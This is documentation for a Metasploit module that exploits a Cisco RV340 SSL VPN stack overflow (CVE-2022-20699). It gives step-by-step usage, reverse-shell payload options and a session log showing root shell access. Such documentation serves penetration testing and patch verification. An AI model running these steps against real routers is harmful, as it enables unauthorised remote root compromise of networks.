## Description

This module exploits a stack buffer overflow ([CVE-2022-20699](https://nvd.nist.gov/vuln/detail/CVE-2022-20699)) in the [Cisco RV series](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-smb-mult-vuln-KA9PK6D.html) routers SSL VPN functionality. The default SSL VPN configuration is exploitable, with no authentication required and works over the Internet as seen in [this video](https://www.youtube.com/watch?v=O1uK_b1Tmts)!

The stack is executable and no ASLR is in place, which makes exploitation easier.
Successful execution of this module results in a reverse root shell. A custom payload is used as Metasploit does not have ARMLE null free shellcode.
This vulnerability was presented by the [Flashback Team](https://twitter.com/flashbackpwn) in [Pwn2Own Austin 2021](https://www.thezdi.com/blog/2021/11/1/pwn2ownaustin) and [OffensiveCon 2022](https://www.offensivecon.org/speakers/2022/radek-domanski-and-pedro-ribeiro.html).

This module has been tested in firmware versions 1.0.03.15 and above and works with around 65% reliability. The service restarts automatically so you can keep trying until you pwn it.

Only the [RV340 router](https://www.cisco.com/c/en/us/products/routers/rv340-dual-gigabit-wan-vpn-router/index.html) was tested, but other RV series routers should work out of the box.

For more information, check the advisory [here](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Austin_2021/flashback_connects/flashback_connects.md) and [here](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Austin2021/flashback_connects/flashback_connects.md).


## Vulnerable Application

Cisco RV340 Router, firmware versions 1.0.03.24 and below. The bug is fixed in 1.0.03.26 and above.

## Verification Steps

  1. Connect to the target on the WAN interface (or provide IP address)
  2. Make sure the SSLVPN service is turned on for the correct WAN interface
  2. Start msfconsole
  3. Do: `use exploits/linux/misc/cisco_rv340_sslvpn.rb`
  4. Set RHOST, RPORT, LHOST and LPORT
  5. Do `check`
  6. Do: `run`
  7. You should get a shell.

## Options
```
Module options (exploit/linux/misc/cisco_rv340_sslvpn):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    8443             yes       The target port (TCP)
   SSL      true             yes       Use SSL
   VHOST                     no        HTTP server virtual host


Payload options (linux/armle/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   ARGV0  sh               no        argv[0] to pass to execve
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/sh          yes       The shell to execute.


Exploit target:

   Id  Name
   --  ----
   0   Cisco RV340 Firmware Version <= 1.0.03.24
```

## Scenarios
```
msf6 exploit(linux/misc/cisco_rv340_sslvpn) > check
[*] 5.55.55.62:8443 - The service is running, but could not be validated.
msf6 exploit(linux/misc/cisco_rv340_sslvpn) > exploit

[*] Started reverse TCP handler on 5.55.55.1:4445
[*] 5.55.55.62:8443 - 5.55.55.62:8443 - Pwning Cisco RV340 Firmware Version <= 1.0.03.24
[*] Command shell session 30 opened (5.55.55.1:4445 -> 5.55.55.62:41976 ) at 2022-02-10 20:12:18 +0000

id
uid=0(root) gid=0(root)
uname -a
Linux router138486 4.1.8 #2 SMP Fri Oct 22 09:50:26 IST 2021 armv7l GNU/Linux
```
